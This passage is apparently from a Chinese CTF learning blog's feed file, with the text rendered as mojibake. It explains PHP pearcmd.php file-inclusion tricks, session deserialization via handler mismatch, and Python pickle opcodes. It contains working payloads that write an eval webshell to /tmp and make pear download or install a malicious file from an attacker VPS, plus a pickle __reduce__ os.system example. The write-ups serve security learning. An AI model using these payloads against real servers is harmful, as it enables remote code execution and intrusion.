text"><br>é‚£ä¹ˆæˆ‘ä»¬å°†ä¸Šé¢çš„å‘½ä»¤è¡Œå˜ä¸ºwebä¼ å‚å³ä¸ºå¦‚ä¸‹<br>è‹¥ä¸ºPOSTä¼ å‚å¯¼è‡´çš„æ–‡ä»¶åŒ…å«<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /?+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>+/tmp/LSE.php HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure><br>å¦‚æœä¸ºGETä¼ å‚å¯¼è‡´çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/7.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/8.png" class="" title="alt text"></p><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p>installè¿™ä¸ªåŠŸèƒ½å¯ä»¥è¿œç¨‹ä¸‹è½½ã€‚é»˜è®¤ä¸‹è½½åˆ°çš„ä½ç½®ä¸º/tmp/pear/download<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/9.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/10.png" class="" title="alt text"><br>è‹¥ä¸ºPOSTå¯ä»¥ç›´æ¥ä½¿ç”¨<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/5.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/6.png" class="" title="alt text"><br>è‹¥ä¸ºGETæˆ‘ä»¬éœ€è¦å¼•å…¥ä¸€ä¸ªå‚æ•°â€”installroot<br>è¿™ä¸ªå‚æ•°å¯ä»¥æ§åˆ¶æˆ‘ä»¬ä¸‹è½½æ–‡ä»¶çš„ä½ç½®<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/12.png" class="" title="alt text"><br>å¯ä»¥å‘ç°å…¶ä¸‹è½½çš„å®é™…ä½ç½®æ˜¯<code>å½“å‰ä½ç½®+/xxxx/tmp/pear/download</code><br>åœ¨webä¸­å½“å‰ä½ç½®ä¸€èˆ¬ä¸º/var/www/html<br>xxxxä¸ºæŒ‡å®šå‚æ•°<br>å…¶paylaodä¸º<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/share/php/pearcmd.php&amp;+http://[vps]/xxx.xxx</span><br></pre></td></tr></table></figure><br>è€Œæœ€ç»ˆä¸‹è½½çš„ä½ç½®ä¸º<code>/var/www/html/&amp;file=/usr/share/php/pearcmd.php/tmp/pear/download/a.php</code></p><h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/13.png" class="" title="alt text"><p>æˆ‘ä»¬å¯ä»¥å‘ç°pear downloadä¸‹è½½ä¸ºå½“å‰ç›®å½•<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/14.png" class="" title="alt text"><br>ç”±äºè¯¥æ–¹æ³•æ— æ³•æŒ‡å®šä½ç½®æ‰€ä»¥éœ€è¦æˆ‘ä»¬åœ¨vpsåˆ›å»ºä¸€ä¸ªç›®å½•ä¸º&amp;file=/usr/share/php/pearcmd.phpå³æ¶æ„æ–‡ä»¶å«pearcmd.phpé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨åŒ…å«çš„åŒæ—¶ä¸‹è½½è¿™ä¸ªæ¶æ„æ–‡ä»¶äº†<br>payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+download+http://111.230.38.159:8000/&amp;file=/usr/share/php/pearcmd.php</span><br></pre></td></tr></table></figure><br>åŒæ ·çš„installä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ¥ä¸‹è½½åˆ°é»˜è®¤ä½ç½®</p><h1 id="å¦‚æœpearcmd-phpè¢«æ¬äº†æ€ä¹ˆåŠ"><a href="#å¦‚æœpearcmd-phpè¢«æ¬äº†æ€ä¹ˆåŠ" class="headerlink" title="å¦‚æœpearcmd.phpè¢«æ¬äº†æ€ä¹ˆåŠ"></a>å¦‚æœpearcmd.phpè¢«æ¬äº†æ€ä¹ˆåŠ</h1><p>å¯ä»¥å°è¯•ä½¿ç”¨peclcmd.php<br>peclcmd.phpå’Œpearcmd.phpä½äºåŒä¸€ç›®å½•ã€‚<br>å› ä¸ºè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†pearcmd.php<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/15.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> æ–‡ä»¶åŒ…å« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sessionååºåˆ—åŒ–</title>
      <link href="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨ä¹‹å‰æ‰“å¸•é²æ¯çš„æ—¶å€™é‡åˆ°äº†ï¼Œphpå†™å…¥æ–‡ä»¶æ¥ä¿®æ”¹sessionè¿›è¡Œä¼ªé€ çš„é¢˜ç›®ã€‚ä»Šå¤©ä¸çŸ¥é“å­¦ä»€ä¹ˆçªç„¶å°±æƒ³åˆ°äº†sessionååºåˆ—åŒ–æˆ‘è¿˜æ²¡æ°´è¿‡åšå®¢ï¼Œäºæ˜¯å†™ä¸‹è¿™ç¯‡å­¦ä¹ åšå®¢"><a href="#åœ¨ä¹‹å‰æ‰“å¸•é²æ¯çš„æ—¶å€™é‡åˆ°äº†ï¼Œphpå†™å…¥æ–‡ä»¶æ¥ä¿®æ”¹sessionè¿›è¡Œä¼ªé€ çš„é¢˜ç›®ã€‚ä»Šå¤©ä¸çŸ¥é“å­¦ä»€ä¹ˆçªç„¶å°±æƒ³åˆ°äº†sessionååºåˆ—åŒ–æˆ‘è¿˜æ²¡æ°´è¿‡åšå®¢ï¼Œäºæ˜¯å†™ä¸‹è¿™ç¯‡å­¦ä¹ åšå®¢" class="headerlink" title="åœ¨ä¹‹å‰æ‰“å¸•é²æ¯çš„æ—¶å€™é‡åˆ°äº†ï¼Œphpå†™å…¥æ–‡ä»¶æ¥ä¿®æ”¹sessionè¿›è¡Œä¼ªé€ çš„é¢˜ç›®ã€‚ä»Šå¤©ä¸çŸ¥é“å­¦ä»€ä¹ˆçªç„¶å°±æƒ³åˆ°äº†sessionååºåˆ—åŒ–æˆ‘è¿˜æ²¡æ°´è¿‡åšå®¢ï¼Œäºæ˜¯å†™ä¸‹è¿™ç¯‡å­¦ä¹ åšå®¢"></a>åœ¨ä¹‹å‰æ‰“å¸•é²æ¯çš„æ—¶å€™é‡åˆ°äº†ï¼Œphpå†™å…¥æ–‡ä»¶æ¥ä¿®æ”¹sessionè¿›è¡Œä¼ªé€ çš„é¢˜ç›®ã€‚ä»Šå¤©ä¸çŸ¥é“å­¦ä»€ä¹ˆçªç„¶å°±æƒ³åˆ°äº†sessionååºåˆ—åŒ–æˆ‘è¿˜æ²¡æ°´è¿‡åšå®¢ï¼Œäºæ˜¯å†™ä¸‹è¿™ç¯‡å­¦ä¹ åšå®¢</h1><h1 id="php-sessionä»‹ç»"><a href="#php-sessionä»‹ç»" class="headerlink" title="php sessionä»‹ç»"></a>php sessionä»‹ç»</h1><p>é¦–å…ˆæˆ‘ä»¬éƒ½çŸ¥é“sessionæ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜å‚¨åœ¨æœåŠ¡ç«¯çš„ï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯ç»è¿‡åºåˆ—åŒ–åçš„æ•°æ®ã€‚è€Œå­˜å‚¨çš„å…·ä½“æ ¼å¼ä¸»è¦ä¸ä¸‹é¢å‡ ä¸ªphp.iniè®¾ç½®æœ‰å…³<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_pathï¼šè¿™æ˜¯sessionæ–‡ä»¶çš„å‚¨å­˜è·¯å¾„</span><br><span class="line">session.auto_startï¼šè¿™ä¸ªå¼€å…³æ˜¯æŒ‡å®šæ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å°±è‡ªåŠ¨å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤ä¸ºOffï¼›å¦‚æœå®ƒä¸ºOnçš„è¯ï¼Œç›¸å½“äºå°±å…ˆæ‰§è¡Œäº†ä¸€ä¸ªsession_start()ï¼Œä¼šç”Ÿæˆä¸€ä¸ªsession_idï¼Œä¸€èˆ¬æ¥è¯´è¿™ä¸ªå¼€å…³æ˜¯ä¸ä¼šæ‰“å¼€çš„</span><br><span class="line">session.save_handlerï¼šè¿™ä¸ªæ˜¯è®¾ç½®ç”¨æˆ·è‡ªå®šä¹‰sessionå­˜å‚¨çš„é€‰é¡¹ï¼Œé»˜è®¤æ˜¯filesï¼Œä¹Ÿå°±æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼æ¥å­˜å‚¨çš„</span><br><span class="line">session.serialize_handlerï¼šè¿™æ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨phpï¼Œè¿˜æœ‰å…¶ä»–å¼•æ“ï¼Œä¸”ä¸åŒå¼•æ“çš„å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒï¼Œé»˜è®¤æ˜¯php</span><br></pre></td></tr></table></figure></p><h2 id="session-serialize-handler"><a href="#session-serialize-handler" class="headerlink" title="session.serialize_handler"></a>session.serialize_handler</h2><p>è¿™ä¸ªè®¾ç½®ä¸»è¦å®šä¹‰ä½¿ç”¨ä»€ä¹ˆå¤„ç†å™¨æ¥å¯¹å†…å®¹è¿›è¡Œå­˜å‚¨ä¸åŒçš„å¤„ç†å™¨å­˜å‚¨æ ¼å¼ä¸åŒ</p><div class="table-container"><table><thead><tr><th style="text-align:center">å¤„ç†å™¨åç§°</th><th style="text-align:left">æ ¼å¼</th><th style="text-align:left">å­˜å‚¨ç»“æœ</th></tr></thead><tbody><tr><td style="text-align:center">php</td><td style="text-align:left">é”®å+ç«–çº¿+åºåˆ—åŒ–å¤„ç†åçš„å†…å®¹</td><td style="text-align:left">name&#124;s:6:â€hahahaâ€;</td></tr><tr><td style="text-align:center">php_binary</td><td style="text-align:left">é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td><td style="text-align:left">names:6:â€hahahaâ€;</td></tr><tr><td style="text-align:center">php_serialize</td><td style="text-align:left">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</td><td style="text-align:left">a:1:{s:4:â€nameâ€;s:6:â€hahahaâ€;}</td></tr></tbody></table></div><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>æˆ‘ä»¬é€šè¿‡ä¸‹é¢è¿™ä¸ªDEMOè¿›è¡Œè®²è§£<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class="" title="alt text"></p><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class="" title="alt text"><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹session_start()å‡½æ•°çš„å®šä¹‰<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class="" title="alt text"><br>ä¼šå‘ç°æ¯æ¬¡å‘æœåŠ¡å™¨ç”¨GET,POST,COOKIEçš„æ–¹æ³•æ¥ä¼ å…¥sessionidï¼Œéƒ½ä¼šé‡å¯sessionæœåŠ¡å¹¶å°†sessionæ–‡ä»¶çš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–å­˜å‚¨åœ¨<code>$_SESSION</code>é‡Œã€‚<br>å½“ç„¶åœ¨ååºåˆ—åŒ–æ­£å¸¸çš„èµ‹å€¼å­˜å‚¨çš„sessionå€¼å¹¶ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœä¸€ä¸ªwebçš„ä¸åŒè·¯ç”±é‡‡ç”¨äº†ä¸åŒçš„å¤„ç†å™¨è¿™å°±æœ‰å¯èƒ½å¯¼è‡´æœ¬ä¸è¯¥æ¯ååºåˆ—åŒ–çš„å†…å®¹æ¯ååºåˆ—åŒ–ã€‚<br>å½“æˆ‘ä»¬ç»™aä¼ å…¥|O:1:â€Aâ€:1:{s:1:â€fâ€;s:5:â€hahahâ€;}åœ¨è®¿é—®flag.phpæ—¶ç”±äºå…¶å¤„ç†å™¨ä¸ºphpè¿™å°±å¯¼è‡´äº†å…¶ä¼šå°†|åçš„è¿›è¡Œè§£æä¸ºåºåˆ—åŒ–è¯­å¥è€Œä¸æ˜¯å­—ç¬¦ä¸²ä»è€Œè¿›è¡Œååºåˆ—åŒ–ã€‚</p><h1 id="æ— -SESSIONå˜é‡çš„èµ‹å€¼"><a href="#æ— -SESSIONå˜é‡çš„èµ‹å€¼" class="headerlink" title="æ— $_SESSIONå˜é‡çš„èµ‹å€¼"></a>æ— $_SESSIONå˜é‡çš„èµ‹å€¼</h1><p>åœ¨æ²¡æœ‰èµ‹å€¼ä»£ç æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<a href="https://www.php.net/manual/zh/session.upload-progress.php">sessionä¸Šä¼ è¿›åº¦</a>æ¥è¿›è¡Œsessionçš„ä¸Šä¼ </p><p>æˆ‘ä»¬åªè¦åœ¨å‘æ–‡ä»¶çš„åŒæ—¶postä¸€ä¸ªsession.upload_progress.nameçš„åŒåå˜é‡<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class="" title="alt text"><br>formè¡¨å•å¦‚ä¸‹<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><br>æ³¨æ„å› ä¸ºè¡¨å•æ²¡æœ‰cookieæ‰€ä»¥æˆ‘ä»¬è¦æ‰‹åŠ¨æ·»åŠ PHPSESSID<br>ä½†æ˜¯å…¶ä¸Šä¼ åå†…å®¹ä¼šå¾ˆå¿«è¢«æ¸…ç©ºæ‰€ä»¥æˆ‘ä»¬è¦ä¸æ–­å‘åŒ…<br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class="" title="alt text"><br><img src="/2024/05/06/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class="" title="alt text"><br>å¯ä»¥çœ‹åˆ°postçš„valueè¢«å­˜å‚¨äº†èµ·æ¥<br>é‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨æ— æ³•å¯¹$_SESSIONèµ‹å€¼æ—¶ä½¿ç”¨è¿™ä¸ªæ¥ä¸Šä¼ sessionæ–‡ä»¶ä»è€Œè¿›è¡Œsessionååºåˆ—åŒ–ã€‚</p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p>å› ä¸ºæ²¡æœ‰æ‰¾åˆ°é¢˜ç›®æ‰€ä»¥å…ˆæ”¾ç€</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢pickleååºåˆ—åŒ–</title>
      <link href="/2024/04/28/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/04/28/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨æ‰“XYæ—¶é‡åˆ°äº†pickleååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æ‰“å‡ºæ¥æ•…å­¦ä¹ ã€‚"><a href="#åœ¨æ‰“XYæ—¶é‡åˆ°äº†pickleååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æ‰“å‡ºæ¥æ•…å­¦ä¹ ã€‚" class="headerlink" title="åœ¨æ‰“XYæ—¶é‡åˆ°äº†pickleååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æ‰“å‡ºæ¥æ•…å­¦ä¹ ã€‚"></a>åœ¨æ‰“XYæ—¶é‡åˆ°äº†pickleååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æ‰“å‡ºæ¥æ•…å­¦ä¹ ã€‚</h1><h1 id="ä»€ä¹ˆæ˜¯pickle"><a href="#ä»€ä¹ˆæ˜¯pickle" class="headerlink" title="ä»€ä¹ˆæ˜¯pickle"></a>ä»€ä¹ˆæ˜¯pickle</h1><p>pickleå…¶å®å°±æ˜¯pythonä¸­ç”¨äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä¸€ç§æ¨¡å—ã€‚<br><br>å…¶å°†å¯¹è±¡åºåˆ—åŒ–çš„ç»“æœæ˜¯ç”±ä¸€ç³»åˆ—opcodeç»„æˆçš„ã€‚å¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lalala</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;dir&quot;</span>,))</span><br><span class="line">haha=lalala()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(haha,protocol=<span class="number">0</span>))</span><br><span class="line">----------------------------------------------</span><br><span class="line">cnt\nsystem\np0\n(Vdir\np1\ntp2\nRp3\n.</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç åˆ©ç”¨äº†<code>__reduce__</code>é­”æœ¯æ–¹æ³•è¯¥æ–¹æ³•å¯ä»¥åœ¨è¢«åºåˆ—åŒ–æ—¶ï¼Œä¼šè¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ‰§è¡Œçš„å‚æ•°ã€‚<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶è¾“å‡ºå€¼ä¸ºV0åè®®çš„opcodeï¼Œè¯¥åè®®ä¹Ÿç§°ä¸ºäººç±»å¯è¯»çš„åè®®ç‰ˆæœ¬ã€‚å…¶å®<code>__reduce__</code>ä¹Ÿå°±æ˜¯Rå…³é”®å­—</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>æ—¢ç„¶å…¶åºåˆ—åŒ–çš„ç»“æœä¸ºopcodeé‚£ä¹ˆæˆ‘ä»¬æƒ³è¦è¾ƒä¸ºæ·±å…¥çš„äº†è§£pickleååºåˆ—åŒ–å°±è¦äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯opcode</p><h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><p>Opcodeï¼Œå…¨ç§°ä¸ºOperation Codeï¼Œæ˜¯æŒ‡æ“ä½œç æˆ–æŒ‡ä»¤ç ï¼Œå®ƒæ˜¯è®¡ç®—æœºä½“ç³»ç»“æ„ä¸­çš„ä¸€éƒ¨åˆ†ã€‚<br>å³opcodeå¯ä»¥ç®—è¾ƒä¸ºåº•å±‚çš„æŒ‡ä»¤ç ã€‚</p><h3 id="pickleä¸­opcodeçš„ç‰ˆæœ¬"><a href="#pickleä¸­opcodeçš„ç‰ˆæœ¬" class="headerlink" title="pickleä¸­opcodeçš„ç‰ˆæœ¬"></a>pickleä¸­opcodeçš„ç‰ˆæœ¬</h3><p>v0 ç‰ˆåè®®æ˜¯åŸå§‹çš„â€œäººç±»å¯è¯»â€åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Pythonã€‚<br>v1 ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹ã€‚<br>ç¬¬ 2 ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­å¼•å…¥çš„ã€‚ å®ƒä¸º æ–°å¼ç±» æä¾›äº†æ›´é«˜æ•ˆçš„å°å­˜æœºåˆ¶ã€‚ è¯·å‚è€ƒ PEP 307 äº†è§£ç¬¬ 2 ç‰ˆåè®®å¸¦æ¥çš„æ”¹è¿›çš„ç›¸å…³ä¿¡æ¯ã€‚<br>v3 ç‰ˆåè®®æ˜¯åœ¨ Python 3.0 ä¸­å¼•å…¥çš„ã€‚ å®ƒæ˜¾å¼åœ°æ”¯æŒå­—èŠ‚å¯¹è±¡ï¼Œä¸èƒ½ä½¿ç”¨ Python 2.x è§£å°ã€‚è¿™æ˜¯ Python 3.0-3.7 çš„é»˜è®¤åè®®ã€‚<br>v4 ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ã€‚å®ƒæ˜¯Python 3.8ä½¿ç”¨çš„é»˜è®¤åè®®ã€‚æœ‰å…³ç¬¬ 4 ç‰ˆåè®®å¸¦æ¥æ”¹è¿›çš„ä¿¡æ¯ï¼Œè¯·å‚é˜… PEP 3154ã€‚<br>ç¬¬ 5 ç‰ˆåè®®æ˜¯åœ¨ Python 3.8 ä¸­åŠ å…¥çš„ã€‚ å®ƒå¢åŠ äº†å¯¹å¸¦å¤–æ•°æ®çš„æ”¯æŒï¼Œå¹¶å¯åŠ é€Ÿå¸¦å†…æ•°æ®å¤„ç†ã€‚</p><h3 id="å¸¸ç”¨çš„opcode"><a href="#å¸¸ç”¨çš„opcode" class="headerlink" title="å¸¸ç”¨çš„opcode"></a>å¸¸ç”¨çš„opcode</h3><p>è¿™é‡Œæˆ‘å°±ç›´æ¥å¼•ç”¨ä¸€ä¸ªå¸ˆå‚…çš„äº†<a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p><div class="table-container"><table><thead><tr><th style="text-align:left">æŒ‡ä»¤</th><th style="text-align:center">æè¿°</th><th style="text-align:right">å…·ä½“å†™æ³•</th><th style="text-align:right">æ ˆä¸Šå˜åŒ–</th></tr></thead><tbody><tr><td style="text-align:left">c</td><td style="text-align:center">è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—</td><td style="text-align:right">c[module]\n[instance]\n</td><td style="text-align:right">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">(</td><td style="text-align:center">å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td style="text-align:right">(</td><td style="text-align:right">MARKæ ‡è®°å…¥æ ˆ</td></tr><tr><td style="text-align:left">o</td><td style="text-align:center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td style="text-align:right">o</td><td style="text-align:right">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td style="text-align:left">i</td><td style="text-align:center">ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td style="text-align:right">i[module]\n[callable]\n</td><td style="text-align:right">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td></tr><tr><td style="text-align:left">N</td><td style="text-align:center">å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td style="text-align:right">N</td><td style="text-align:right">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td></tr><tr><td style="text-align:left">S</td><td 